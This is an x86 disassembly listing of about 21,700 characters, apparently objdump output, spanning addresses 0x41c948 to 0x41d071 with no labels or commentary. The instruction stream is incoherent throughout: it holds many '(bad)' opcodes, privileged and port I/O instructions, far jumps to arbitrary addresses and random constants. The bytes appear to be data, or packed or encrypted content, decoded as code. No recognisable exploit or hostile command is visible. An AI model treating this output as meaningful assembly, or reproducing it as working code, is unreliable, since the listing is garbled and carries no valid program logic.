  41c948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c949:	mov    ebp,0xbe2cd1cb
  41c94e:	outs   dx,BYTE PTR ds:[esi]
  41c94f:	sub    DWORD PTR [eax],esi
  41c951:	xchg   ecx,eax
  41c952:	jae    0x41c913
  41c954:	xor    eax,DWORD PTR [eax]
  41c956:	add    ecx,ebx
  41c958:	xlat   BYTE PTR ds:[ebx]
  41c959:	mov    al,BYTE PTR [eax+ecx*1+0x5e]
  41c95d:	(bad)  
  41c95e:	xchg   edi,eax
  41c95f:	(bad)  
  41c960:	push   ebx
  41c961:	push   esi
  41c962:	dec    ebp
  41c963:	loopne 0x41c952
  41c965:	mov    ds:0x6da39a09,eax
  41c96a:	jbe    0x41c8fd
  41c96c:	and    DWORD PTR [edi-0x355cf971],eax
  41c972:	sub    al,0x6e
  41c974:	dec    ebx
  41c975:	loopne 0x41c951
  41c977:	lock add eax,0x45c34320
  41c97d:	sbb    DWORD PTR [ebx+0x787f3a95],0xe230f834
  41c987:	test   al,0xc4
  41c989:	xor    BYTE PTR [edx-0x2dd4e553],0xd2
  41c990:	gs sbb cl,bh
  41c993:	cli    
  41c994:	iret   
  41c995:	inc    edx
  41c996:	rcl    DWORD PTR [eax-0x9],1
  41c999:	dec    ecx
  41c99a:	push   ecx
  41c99b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c99c:	imul   DWORD PTR [eax]
  41c99e:	cmp    dl,BYTE PTR [edi]
  41c9a0:	fld    st(4)
  41c9a2:	(bad)  
  41c9a3:	out    0x41,eax
  41c9a5:	lea    ebx,[ebx-0x5d]
  41c9a8:	test   DWORD PTR [edi+0x436c804b],0xf4d678a4
  41c9b2:	xchg   ebp,eax
  41c9b3:	push   eax
  41c9b4:	rcl    DWORD PTR [edx+0x4f141d1a],0xfc
  41c9bb:	popa   
  41c9bc:	sub    al,0xc8
  41c9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9bf:	sub    eax,0xd8345d84
  41c9c4:	pop    esi
  41c9c5:	sbb    al,0x1
  41c9c7:	mov    cl,0xce
  41c9c9:	jns    0x41c9a2
  41c9cb:	mov    cl,0x5c
  41c9cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9ce:	out    0x4d,al
  41c9d0:	leave  
  41c9d1:	or     edx,eax
  41c9d3:	xchg   ecx,eax
  41c9d4:	pop    es
  41c9d5:	sub    eax,0xdb8a94e2
  41c9da:	ja     0x41ca3a
  41c9dc:	pop    ebx
  41c9dd:	out    dx,al
  41c9de:	mov    edx,0x769ebaf9
  41c9e3:	sub    al,0xc3
  41c9e5:	pop    edx
  41c9e6:	sbb    BYTE PTR [eax],ah
  41c9e8:	pusha  
  41c9e9:	sub    dl,BYTE PTR [ebx-0x39fa1909]
  41c9ef:	add    DWORD PTR [edi+edx*8-0x1491c6c1],edi
  41c9f6:	dec    edx
  41c9f7:	push   edx
  41c9f8:	enter  0x49c,0xc0
  41c9fc:	out    0x6c,eax
  41c9fe:	rcr    BYTE PTR [edi],0xdc
  41ca01:	out    0x74,eax
  41ca03:	xchg   BYTE PTR [ecx-0x17],bh
  41ca06:	push   esi
  41ca07:	sub    eax,0xa67a752a
  41ca0c:	add    al,0xb4
  41ca0e:	stos   DWORD PTR es:[edi],eax
  41ca0f:	bound  ebx,QWORD PTR [ebp+0x75d88a1a]
  41ca15:	mov    ebp,0xaabfb214
  41ca1a:	inc    edi
  41ca1b:	dec    edi
  41ca1c:	add    eax,0x55dd0a3d
  41ca21:	dec    ebx
  41ca22:	mov    ch,0x68
  41ca24:	jecxz  0x41c9e3
  41ca26:	mov    ds:0x91a4aa1e,eax
  41ca2b:	adc    eax,0x33e540c3
  41ca30:	adc    eax,ebx
  41ca32:	xchg   esp,eax
  41ca33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca34:	fnstcw WORD PTR ds:0x1e29523b
  41ca3a:	dec    ebx
  41ca3b:	push   ds
  41ca3c:	adc    dh,BYTE PTR [ecx+0x5165e280]
  41ca42:	sar    BYTE PTR [eax],cl
  41ca44:	jno    0x41ca2d
  41ca46:	push   0xffffff96
  41ca48:	aam    0x68
  41ca4a:	and    dl,bl
  41ca4c:	push   esi
  41ca4d:	adc    cl,BYTE PTR [eax]
  41ca4f:	stos   BYTE PTR es:[edi],al
  41ca50:	push   eax
  41ca51:	cmp    edi,esi
  41ca53:	inc    ebp
  41ca54:	adc    al,0x1b
  41ca56:	in     al,0x63
  41ca58:	inc    esi
  41ca59:	stos   BYTE PTR es:[edi],al
  41ca5a:	cdq    
  41ca5b:	fdiv   QWORD PTR [ebx-0x5b]
  41ca5e:	xor    BYTE PTR [edi-0x53],0xcc
  41ca62:	mov    ds:0x28a969ee,eax
  41ca67:	push   0xffffffc6
  41ca69:	adc    BYTE PTR [ecx+0x2ab01c1f],ah
  41ca6f:	cmp    edx,DWORD PTR [eax+ebx*8]
  41ca72:	xchg   esi,eax
  41ca73:	(bad)  
  41ca75:	stos   BYTE PTR es:[edi],al
  41ca76:	jae    0x41ca67
  41ca78:	inc    eax
  41ca79:	or     al,0x77
  41ca7b:	mov    WORD PTR [ebx],ds
  41ca7d:	out    0x86,eax
  41ca7f:	inc    esp
  41ca80:	cmp    eax,0xa475efbf
  41ca85:	pop    ds
  41ca86:	sbb    al,ah
  41ca88:	out    dx,al
  41ca89:	jge    0x41ca84
  41ca8b:	mov    ebp,0x71ce84d9
  41ca90:	sub    al,0xfc
  41ca92:	fistp  DWORD PTR [edi-0xf0f7f02]
  41ca98:	pop    esi
  41ca99:	aas    
  41ca9a:	push   ecx
  41ca9b:	test   eax,0x494aac7e
  41caa0:	stc    
  41caa1:	neg    DWORD PTR [esi]
  41caa3:	push   ebx
  41caa4:	mov    ah,0xf0
  41caa6:	aam    0xd3
  41caa8:	aad    0xf3
  41caaa:	add    esp,DWORD PTR [ebx+eax*1]
  41caad:	jae    0x41cad4
  41caaf:	pop    esi
  41cab0:	xchg   ecx,eax
  41cab1:	jbe    0x41ca8c
  41cab3:	test   DWORD PTR [edx-0x42e9c603],eax
  41cab9:	pop    ebx
  41caba:	inc    esi
  41cabb:	mov    edx,0xf06a1434
  41cac0:	pusha  
  41cac1:	retf   0x709d
  41cac4:	mov    edi,0x198f6728
  41cac9:	rcl    BYTE PTR [ebx-0x676d4832],0x50
  41cad0:	repz jg 0x41ca7c
  41cad3:	ss jbe 0x41cac9
  41cad6:	sbb    al,0x1d
  41cad8:	and    ch,BYTE PTR [edi+0x7b]
  41cadb:	sbb    ebp,0x67
  41cade:	xor    ebx,esi
  41cae0:	and    ax,0xc19d
  41cae4:	mov    bh,0x33
  41cae6:	leave  
  41cae7:	xor    al,0xa1
  41cae9:	pop    es
  41caea:	(bad)  
  41caec:	js     0x41cb55
  41caee:	fisttp WORD PTR [edx]
  41caf0:	pop    esi
  41caf1:	dec    esi
  41caf2:	add    al,0xb7
  41caf4:	mov    ecx,0xe9a113e1
  41caf9:	in     eax,dx
  41cafa:	mov    ebp,0x92c7d365
  41caff:	pop    es
  41cb00:	rcr    esp,cl
  41cb02:	iret   
  41cb03:	ja     0x41cb12
  41cb05:	xchg   ebx,eax
  41cb06:	mov    ch,0xdf
  41cb08:	mov    ebx,0x5e50ec97
  41cb0d:	in     eax,0xf3
  41cb0f:	xchg   ebp,eax
  41cb10:	mov    dl,0xfc
  41cb12:	jns    0x41cb5f
  41cb14:	pop    esi
  41cb15:	and    al,0x87
  41cb17:	cmp    ch,ch
  41cb19:	shl    BYTE PTR [ecx+0x4a],0x68
  41cb1d:	mov    dl,0x9a
  41cb1f:	sbb    eax,0x55b8d2e4
  41cb24:	xlat   BYTE PTR ds:[ebx]
  41cb25:	mov    ebp,0xc8bb931
  41cb2a:	mov    al,0xcd
  41cb2c:	xor    ecx,eax
  41cb2e:	pop    edx
  41cb2f:	mov    al,ds:0x925c4d3c
  41cb34:	sbb    eax,0x9cf2110c
  41cb39:	(bad)  
  41cb3b:	ret    
  41cb3c:	in     eax,0x2e
  41cb3e:	scas   eax,DWORD PTR es:[edi]
  41cb3f:	adc    ch,BYTE PTR [edx]
  41cb41:	jg     0x41cb3b
  41cb43:	sbb    al,0x8d
  41cb46:	(bad)
  41cb49:	mov    eax,ds:0x4f76f105
  41cb4e:	mov    dl,0xa1
  41cb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb51:	pop    esi
  41cb52:	fmulp  st(0),st
  41cb54:	lahf   
  41cb55:	pop    es
  41cb56:	and    esi,esp
  41cb58:	fistp  QWORD PTR [ebx+0x7c9a9afa]
  41cb5e:	mov    edx,0xfb3bf99f
  41cb63:	imul   esi,DWORD PTR [esi-0x7cc847e2],0x7365c99d
  41cb6d:	and    al,bl
  41cb6f:	pop    ebp
  41cb70:	repz fisub WORD PTR [eax]
  41cb73:	ja     0x41cbbe
  41cb75:	adc    edx,DWORD PTR [edi]
  41cb77:	mul    DWORD PTR [ebx-0x31]
  41cb7a:	sub    eax,0xfafe21ff
  41cb7f:	add    al,0x4b
  41cb81:	push   0x4a958f66
  41cb86:	inc    esp
  41cb87:	and    bh,bh
  41cb89:	sub    eax,0xd455907e
  41cb8e:	push   es
  41cb8f:	shl    DWORD PTR [esi],0x3f
  41cb92:	adc    esi,edi
  41cb94:	js     0x41cb88
  41cb96:	jg     0x41cbdd
  41cb98:	ret    
  41cb99:	out    0x17,eax
  41cb9b:	xor    DWORD PTR [ebx],esp
  41cb9d:	dec    eax
  41cb9e:	add    eax,0x25a3ff45
  41cba3:	xor    eax,DWORD PTR [edi+0x61ce4a7b]
  41cba9:	scas   eax,DWORD PTR es:[edi]
  41cbaa:	clc    
  41cbab:	jns    0x41cb36
  41cbad:	push   edx
  41cbae:	call   0xf818312f
  41cbb3:	or     eax,0xe7b64856
  41cbb8:	mov    bh,0x21
  41cbbb:	mov    bl,0x22
  41cbbd:	pop    ss
  41cbbe:	and    dh,BYTE PTR [esi-0x41]
  41cbc1:	adc    edx,edx
  41cbc3:	cmp    cl,BYTE PTR [edx-0x64569b3d]
  41cbc9:	sub    esi,DWORD PTR [ebx+0x29273f52]
  41cbcf:	cmp    eax,0x8194d8b1
  41cbd4:	sbb    eax,0xcad7afd1
  41cbd9:	loopne 0x41cb93
  41cbdb:	lods   eax,DWORD PTR ds:[esi]
  41cbdc:	retf   0x963e
  41cbdf:	inc    eax
  41cbe0:	mov    eax,ds:0x4abacaf4
  41cbe5:	sub    eax,0x330275f2
  41cbea:	inc    eax
  41cbeb:	loope  0x41cbc3
  41cbed:	and    BYTE PTR [edi-0x42a43b71],bh
  41cbf3:	cwde   
  41cbf4:	mov    esi,DWORD PTR [eax+ebx*8]
  41cbf7:	mov    cl,0x45
  41cbf9:	pop    ss
  41cbfa:	add    edi,esi
  41cbfc:	inc    edi
  41cbfd:	(bad)  
  41cbfe:	daa    
  41cbff:	in     al,dx
  41cc00:	call   0x3344:0xf82892ae
  41cc07:	push   esi
  41cc08:	fld    DWORD PTR [ebp+0x32]
  41cc0b:	push   edi
  41cc0c:	add    eax,DWORD PTR [ebx]
  41cc0e:	outs   dx,DWORD PTR ds:[esi]
  41cc0f:	push   0xd9eaacf2
  41cc14:	sbb    edi,esp
  41cc16:	mul    BYTE PTR [ebx]
  41cc18:	mov    edx,0x8cb62fc7
  41cc1d:	rcr    DWORD PTR [edx],1
  41cc1f:	test   al,0x22
  41cc21:	out    0xe6,al
  41cc23:	cmp    eax,0x4680229e
  41cc28:	sbb    al,0x80
  41cc2a:	mov    ah,0x5f
  41cc2c:	push   cs
  41cc2d:	shl    BYTE PTR [ebx-0x51],0x9
  41cc31:	xchg   ebx,eax
  41cc32:	repnz add BYTE PTR [edx],dl
  41cc35:	(bad)  
  41cc36:	int    0xe7
  41cc38:	or     eax,0x71ac5f4b
  41cc3d:	or     al,0x0
  41cc3f:	dec    ebp
  41cc40:	sub    BYTE PTR [edi],al
  41cc42:	pop    edx
  41cc43:	mov    cs,WORD PTR [ecx]
  41cc45:	enter  0x9e2e,0xc5
  41cc49:	adc    DWORD PTR [ecx+0x4d032b22],ebp
  41cc4f:	fcmove st,st(1)
  41cc51:	push   esp
  41cc52:	(bad)  
  41cc53:	jmp    0x9d33:0x154ef89b
  41cc5a:	lds    ecx,FWORD PTR [eax+edi*4]
  41cc5d:	loope  0x41cc73
  41cc5f:	sbb    edx,DWORD PTR [ebx+edi*1+0x88b6595]
  41cc66:	mov    ch,0x2b
  41cc68:	pop    ss
  41cc69:	rcl    ebp,cl
  41cc6b:	dec    edi
  41cc6c:	rol    DWORD PTR [edx*2-0x2fe7a20d],0x6d
  41cc74:	mov    ch,BYTE PTR [edx-0x3b]
  41cc77:	xor    al,BYTE PTR [edi+0x56]
  41cc7a:	sub    ecx,DWORD PTR [eax+0x3d500915]
  41cc80:	repnz ins DWORD PTR es:[edi],dx
  41cc82:	std    
  41cc83:	aam    0xaa
  41cc85:	and    edx,DWORD PTR [edx+edi*4-0x13ddad82]
  41cc8c:	pop    ds
  41cc8d:	add    ebx,ebx
  41cc8f:	pop    DWORD PTR ds:0xdda1c38c
  41cc95:	fprem1 
  41cc97:	sub    DWORD PTR [ebp+0x54],ebx
  41cc9a:	sub    ax,0x29a6
  41cc9e:	add    ebx,DWORD PTR ds:0x3b16228
  41cca4:	sub    al,0xb7
  41cca6:	fimul  DWORD PTR [ebx+edi*1]
  41cca9:	and    esi,DWORD PTR [ecx+0x1e39f0c7]
  41ccaf:	cwde   
  41ccb0:	and    al,0x4a
  41ccb2:	mov    fs,WORD PTR [edi]
  41ccb4:	xor    DWORD PTR [ebx-0x46],ecx
  41ccb7:	mov    ah,0xd5
  41ccb9:	out    dx,al
  41ccba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccbb:	daa    
  41ccbc:	(bad)  
  41ccbd:	imul   esi,DWORD PTR [ebx-0x4a],0x36c52b43
  41ccc4:	pushf  
  41ccc5:	sbb    al,0x53
  41ccc7:	test   eax,0x202994a5
  41cccc:	ds jae 0x41ccfa
  41cccf:	mov    cl,0x5c
  41ccd1:	sahf   
  41ccd2:	jp     0x41cca4
  41ccd4:	jl     0x41cd32
  41ccd6:	out    dx,al
  41ccd7:	test   DWORD PTR [edx-0x2bfa88d],esp
  41ccdd:	cmp    DWORD PTR [edi],ebp
  41ccdf:	adc    eax,ecx
  41cce1:	adc    DWORD PTR [edi+ebp*4],eax
  41cce4:	jmp    0x6841fbba
  41cce9:	js     0x41ccb1
  41cceb:	inc    edi
  41ccec:	les    esi,FWORD PTR [esi]
  41ccee:	gs xchg edx,eax
  41ccf0:	push   esi
  41ccf1:	dec    eax
  41ccf2:	rcl    al,1
  41ccf4:	lock jae 0x41cd43
  41ccf7:	pop    edx
  41ccf8:	gs add ecx,eax
  41ccfb:	addr16 sub eax,0xbb7c7e65
  41cd01:	fist   WORD PTR [edx-0x75]
  41cd04:	cld    
  41cd05:	shl    DWORD PTR [ebx],0x11
  41cd08:	enter  0xe1ed,0x97
  41cd0c:	mov    ch,BYTE PTR [ecx+0x43]
  41cd0f:	push   0x44
  41cd11:	pop    ebp
  41cd12:	paddsb mm7,mm1
  41cd15:	out    0x6a,al
  41cd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd18:	mov    ebp,0x497606a
  41cd1d:	and    ebp,0xffffffa6
  41cd20:	lea    edi,[edx+edi*1+0x7dc43bef]
  41cd27:	sti    
  41cd28:	cwde   
  41cd29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd2a:	mov    al,0x8e
  41cd2c:	sub    DWORD PTR [ebp+0x34],esp
  41cd2f:	jmp    0xb242771a
  41cd34:	in     al,0x47
  41cd36:	outs   dx,BYTE PTR ds:[esi]
  41cd37:	jle    0x41cd31
  41cd39:	adc    dh,BYTE PTR [edi]
  41cd3b:	jbe    0x41cd17
  41cd3d:	cmp    ecx,DWORD PTR [edx]
  41cd3f:	arpl   bp,si
  41cd41:	mov    dh,0x25
  41cd43:	sub    ah,BYTE PTR [edx]
  41cd45:	mov    al,ds:0xbf489040
  41cd4a:	mov    esp,0xf164a956
  41cd4f:	mov    ds,WORD PTR [ebx-0xc3ffdb1]
  41cd55:	nop
  41cd56:	or     dl,BYTE PTR es:[edx+0x6]
  41cd5a:	aad    0x8c
  41cd5c:	xchg   ecx,eax
  41cd5d:	sbb    al,0x3b
  41cd5f:	mov    eax,ds:0xa5a0ee3b
  41cd64:	adc    eax,0x266db5f4
  41cd69:	xchg   ebp,eax
  41cd6a:	xor    BYTE PTR [edx+0x18],dl
  41cd6d:	lds    ebp,FWORD PTR [edx+esi*2+0x752e714a]
  41cd74:	mov    ecx,DWORD PTR [edx+0x17]
  41cd77:	cmp    edi,DWORD PTR [ebp+0x3b8bc03a]
  41cd7d:	cs iret 
  41cd7f:	daa    
  41cd80:	mov    WORD PTR [ecx-0x682e054d],es
  41cd86:	adc    eax,0xaa20057c
  41cd8b:	fisub  WORD PTR [edi]
  41cd8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd8e:	and    esi,ebp
  41cd90:	or     edx,DWORD PTR [edx+edi*2]
  41cd93:	dec    esp
  41cd94:	dec    edi
  41cd95:	or     ebp,esp
  41cd97:	(bad)  
  41cd98:	cmc    
  41cd99:	aaa    
  41cd9a:	enter  0x1804,0x56
  41cd9e:	push   edi
  41cd9f:	sti    
  41cda0:	cmp    DWORD PTR [edi-0x485ae78e],esi
  41cda6:	out    dx,eax
  41cda7:	test   DWORD PTR [esi-0x78c95a56],edx
  41cdad:	cmp    DWORD PTR [eax+0x52],ebp
  41cdb0:	(bad)  [ecx]
  41cdb2:	xlat   BYTE PTR ds:[ebx]
  41cdb3:	pop    eax
  41cdb4:	inc    ebp
  41cdb5:	out    0xcf,eax
  41cdb7:	int3   
  41cdb8:	ror    BYTE PTR [eax-0x5e],1
  41cdbb:	clc    
  41cdbc:	test   DWORD PTR [eax-0x5b],edi
  41cdbf:	dec    ebx
  41cdc0:	xchg   esp,eax
  41cdc1:	nop
  41cdc2:	xchg   BYTE PTR [ecx],al
  41cdc4:	add    esi,DWORD PTR [ebp+0x2a]
  41cdc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdc8:	ret    
  41cdc9:	std    
  41cdca:	outs   dx,BYTE PTR ds:[esi]
  41cdcb:	inc    esp
  41cdcc:	fldcw  WORD PTR [ebx+0x72]
  41cdcf:	xor    DWORD PTR [esi],ebx
  41cdd1:	sub    eax,0x6a44f186
  41cdd6:	push   edx
  41cdd7:	out    dx,al
  41cdd8:	pop    es
  41cdd9:	mov    ch,0x7e
  41cddb:	retf   0x3a2d
  41cdde:	ins    BYTE PTR es:[edi],dx
  41cddf:	lahf   
  41cde0:	jle    0x41cdf7
  41cde2:	sahf   
  41cde3:	jbe    0x41ce2a
  41cde5:	test   DWORD PTR [edx+0x5a],esp
  41cde8:	pop    es
  41cde9:	push   edx
  41cdea:	sub    eax,0x9cc6d403
  41cdef:	dec    eax
  41cdf0:	int    0x5f
  41cdf2:	or     ch,BYTE PTR [ebx-0x36bb4021]
  41cdf8:	cld    
  41cdf9:	stos   DWORD PTR es:[edi],eax
  41cdfa:	and    edi,DWORD PTR [ebx]
  41cdfc:	dec    esi
  41cdfd:	adc    dh,BYTE PTR [edi+ebp*8]
  41ce00:	lods   al,BYTE PTR ds:[esi]
  41ce01:	mov    ecx,0xf2c2a69f
  41ce06:	pop    edi
  41ce07:	cmp    BYTE PTR [edi],0xec
  41ce0a:	push   edx
  41ce0b:	mov    ecx,0x76bb5da1
  41ce10:	add    BYTE PTR [ebx],dl
  41ce12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce13:	adc    edx,DWORD PTR [eax]
  41ce15:	mov    BYTE PTR [edi],dl
  41ce17:	or     BYTE PTR [eax-0x2e],ch
  41ce1a:	pusha  
  41ce1b:	call   0xcde1effb
  41ce20:	add    bl,bh
  41ce22:	or     DWORD PTR [esi+edi*2],edi
  41ce25:	push   esi
  41ce26:	or     dh,BYTE PTR [edx-0x50be518c]
  41ce2c:	ins    BYTE PTR es:[edi],dx
  41ce2d:	adc    eax,0x5308e043
  41ce32:	cmc    
  41ce33:	xchg   esp,eax
  41ce34:	push   edx
  41ce35:	cmp    DWORD PTR [esi-0x2e],edx
  41ce38:	push   eax
  41ce39:	ret    0xd540
  41ce3c:	rcr    ecx,1
  41ce3e:	push   edi
  41ce3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce40:	cmc    
  41ce41:	or     DWORD PTR [ebx+0x66],ebx
  41ce44:	xor    BYTE PTR [eax],0xca
  41ce47:	add    al,0xd8
  41ce49:	leave  
  41ce4a:	mov    dl,BYTE PTR [esi]
  41ce4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce4d:	lods   eax,DWORD PTR ds:[esi]
  41ce4e:	sbb    ah,BYTE PTR [ebx]
  41ce50:	into   
  41ce51:	out    0x50,al
  41ce53:	mov    DWORD PTR [edi-0x48],edi
  41ce56:	test   eax,0xb48b9f01
  41ce5b:	data16 fdiv st(6),st
  41ce5e:	(bad)  
  41ce5f:	jge    0x41ce36
  41ce61:	jmp    0x19ff:0xc0855722
  41ce68:	add    BYTE PTR [bx+0x24],dh
  41ce6c:	je     0x41ce55
  41ce6e:	add    BYTE PTR [ebx-0x297fab7f],ah
  41ce74:	sbb    al,0xc8
  41ce76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce77:	lods   eax,DWORD PTR ds:[esi]
  41ce78:	inc    ebx
  41ce79:	icebp  
  41ce7a:	jbe    0x41cecf
  41ce7c:	pop    ebx
  41ce7d:	jnp    0x41ce5f
  41ce7f:	jge    0x41ce0a
  41ce81:	inc    esp
  41ce82:	test   ebp,edi
  41ce84:	xchg   DWORD PTR fs:[si-0x5d14],esi
  41ce8a:	js     0x41ce1b
  41ce8c:	rcr    DWORD PTR [edi+0x26691d58],cl
  41ce92:	cwde   
  41ce93:	js     0x41cebf
  41ce95:	icebp  
  41ce96:	mov    cl,0xb8
  41ce98:	pop    ecx
  41ce99:	and    bl,cl
  41ce9b:	popa   
  41ce9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9d:	out    0xd5,al
  41ce9f:	repnz popf 
  41cea1:	push   DWORD PTR [esi+0x7ec10876]
  41cea7:	test   eax,0x6257bedd
  41ceac:	mov    cl,0x1e
  41ceae:	jbe    0x41cf0c
  41ceb0:	adc    BYTE PTR [edi-0x7f],dh
  41ceb3:	icebp  
  41ceb4:	jbe    0x41ce87
  41ceb6:	data16 das 
  41ceb8:	rcl    al,cl
  41ceba:	mov    BYTE PTR [edi+0x2979997d],0xa0
  41cec1:	outs   dx,DWORD PTR ds:[esi]
  41cec2:	cs sub eax,0xb1b27ced
  41cec8:	hlt    
  41cec9:	push   ss
  41ceca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cecb:	je     0x41cee3
  41cecd:	cmp    BYTE PTR [eax+0x8b438cc],dl
  41ced3:	jne    0x41ced3
  41ced5:	xor    edi,DWORD PTR [esi-0x37293be9]
  41cedb:	dec    edi
  41cedc:	dec    ebp
  41cedd:	inc    ebp
  41cede:	(bad)  
  41cedf:	ficomp WORD PTR [ebx-0x5b]
  41cee2:	(bad)
  41cee6:	ins    DWORD PTR es:[edi],dx
  41cee7:	popf   
  41cee8:	mov    dl,0xba
  41ceea:	and    ebx,DWORD PTR [edx]
  41ceec:	ret    
  41ceed:	inc    ebx
  41ceee:	test   DWORD PTR [eax],edi
  41cef0:	es push 0x418991ee
  41cef6:	lods   al,BYTE PTR ds:[esi]
  41cef7:	inc    edi
  41cef8:	pop    ds
  41cef9:	lock lds ebx,FWORD PTR [edi+0x14]
  41cefd:	or     eax,0x2768327e
  41cf02:	mov    esi,ecx
  41cf04:	cmc    
  41cf05:	jg     0x41cf47
  41cf07:	dec    edx
  41cf08:	or     bh,ah
  41cf0a:	repnz stos BYTE PTR es:[edi],al
  41cf0c:	dec    esi
  41cf0d:	popa   
  41cf0e:	outs   dx,BYTE PTR ds:[esi]
  41cf0f:	add    al,0x78
  41cf11:	loope  0x41cf5a
  41cf13:	dec    edx
  41cf14:	js     0x41ce96
  41cf16:	iret   
  41cf17:	out    dx,eax
  41cf18:	je     0x41cf0b
  41cf1a:	loop   0x41cf9a
  41cf1c:	rcr    DWORD PTR [ecx+0x66],cl
  41cf1f:	std    
  41cf20:	out    0x6d,eax
  41cf22:	cmc    
  41cf23:	retf   
  41cf24:	add    DWORD PTR [edi+ebp*1],ebx
  41cf27:	cmc    
  41cf28:	mov    esi,0x75af27cb
  41cf2d:	xchg   ebx,eax
  41cf2e:	aad    0x5f
  41cf30:	cmp    al,0x59
  41cf32:	push   0xfffffff0
  41cf34:	addr16 inc ecx
  41cf36:	sub    dh,BYTE PTR ss:[eax+0x4a]
  41cf3a:	cmp    cl,bl
  41cf3c:	retf   0xeb28
  41cf3f:	repnz dec ebp
  41cf41:	outs   dx,BYTE PTR ds:[esi]
  41cf43:	inc    edx
  41cf44:	pusha  
  41cf45:	pand   mm1,QWORD PTR [esp+edx*2+0x23146526]
  41cf4d:	mov    al,ds:0xc9c1bd8c
  41cf52:	inc    ecx
  41cf53:	add    dh,0x27
  41cf56:	lock das 
  41cf58:	cwde   
  41cf59:	icebp  
  41cf5a:	nop
  41cf5b:	mov    eax,0x98535b27
  41cf60:	imul   ecx,DWORD PTR [ecx-0x21],0x222b819d
  41cf67:	adc    bh,BYTE PTR [edi+eiz*4+0x23]
  41cf6b:	fs stc 
  41cf6d:	jecxz  0x41cf7d
  41cf6f:	test   dl,ch
  41cf71:	cmp    ch,BYTE PTR [eax]
  41cf73:	sub    edi,DWORD PTR [eax+ebx*8-0x65]
  41cf77:	xor    al,0x15
  41cf79:	je     0x41cf5e
  41cf7b:	dec    esp
  41cf7c:	loop   0x41cf34
  41cf7e:	test   BYTE PTR [esp+eax*1-0x17c288c7],bl
  41cf85:	and    cl,dl
  41cf87:	mov    ch,0x43
  41cf89:	adc    BYTE PTR [edx],ah
  41cf8b:	test   DWORD PTR ds:0x808a9929,ebx
  41cf91:	jae    0x41cf53
  41cf93:	and    al,BYTE PTR [eax+0x3a863491]
  41cf99:	lock mov al,BYTE PTR [ebp-0x748c6e42]
  41cfa0:	xor    BYTE PTR ds:0xdb6ed432,0x8d
  41cfa7:	and    dh,BYTE PTR [ebx+0x5e1e9545]
  41cfad:	aad    0x52
  41cfaf:	jmp    0xa6a39187
  41cfb4:	dec    esi
  41cfb5:	ret    0xc9c7
  41cfb8:	mov    dl,0xe5
  41cfba:	or     eax,0x7044e107
  41cfbf:	(bad)  
  41cfc0:	fist   DWORD PTR [eax-0x3d]
  41cfc3:	pop    ss
  41cfc4:	or     eax,0x78913254
  41cfc9:	or     DWORD PTR [eax-0x27],ebx
  41cfcc:	inc    ebx
  41cfcd:	in     al,dx
  41cfce:	or     ecx,ebx
  41cfd0:	pop    esp
  41cfd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfd2:	clc    
  41cfd3:	push   ds
  41cfd4:	jge    0x41cff9
  41cfd6:	ficomp WORD PTR [edx]
  41cfd8:	sbb    al,0xe2
  41cfda:	cmp    esi,esp
  41cfdc:	mov    dh,0x70
  41cfde:	sub    ecx,DWORD PTR [edx+esi*8+0x1e94e40d]
  41cfe5:	mov    WORD PTR [ebx-0x50],?
  41cfe8:	and    al,0xe0
  41cfea:	xchg   esi,eax
  41cfeb:	pop    ds
  41cfec:	mov    eax,ds:0x726a6c09
  41cff1:	aam    0x4e
  41cff3:	arpl   WORD PTR [ebp+0x79a4db8a],dx
  41cff9:	ins    BYTE PTR es:[edi],dx
  41cffa:	mov    edx,0xd36a8050
  41cfff:	je     0x41d061
  41d001:	or     dh,dl
  41d003:	fcom   QWORD PTR [ebp-0x3011d0af]
  41d009:	out    dx,eax
  41d00a:	inc    edx
  41d00b:	xlat   BYTE PTR ds:[ebx]
  41d00c:	sti    
  41d00d:	les    esi,FWORD PTR [esi-0x50]
  41d010:	adc    BYTE PTR [ebp-0x7b],dl
  41d013:	cmp    BYTE PTR [ebx+0x1f3a8bf4],al
  41d019:	sahf   
  41d01a:	pop    es
  41d01b:	aaa    
  41d01c:	push   0xd5e317fd
  41d021:	mov    edi,0x2a880a01
  41d026:	ins    BYTE PTR es:[edi],dx
  41d027:	sti    
  41d028:	rol    DWORD PTR [edx+0xd],0x15
  41d02c:	sub    DWORD PTR [ecx],eax
  41d02e:	sbb    bl,BYTE PTR [ecx+ecx*4-0x9103d59]
  41d035:	pop    ebp
  41d036:	dec    edx
  41d037:	adc    ah,al
  41d039:	cmc    
  41d03a:	mov    dh,0xd8
  41d03c:	imul   ebx,DWORD PTR [edi+eiz*8],0xde4ad369
  41d043:	jecxz  0x41d067
  41d045:	xor    eax,0x2f5b2fef
  41d04a:	inc    ebp
  41d04b:	mov    eax,DWORD PTR [edx]
  41d04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d04e:	push   esp
  41d04f:	or     ebx,ecx
  41d051:	call   FWORD PTR ds:[eax-0x1ef52267]
  41d058:	jae    0x41d053
  41d05a:	jb     0x41d0cd
  41d05c:	or     al,bl
  41d05e:	fstp   QWORD PTR [ebp-0x63]
  41d061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d062:	jns    0x41d053
  41d064:	sbb    BYTE PTR [eax+0x1],ah
  41d067:	pusha  
  41d068:	les    edx,FWORD PTR [eax-0x15]
  41d06b:	add    ecx,DWORD PTR [esi-0x35fb486a]
  41d071:	pop    es
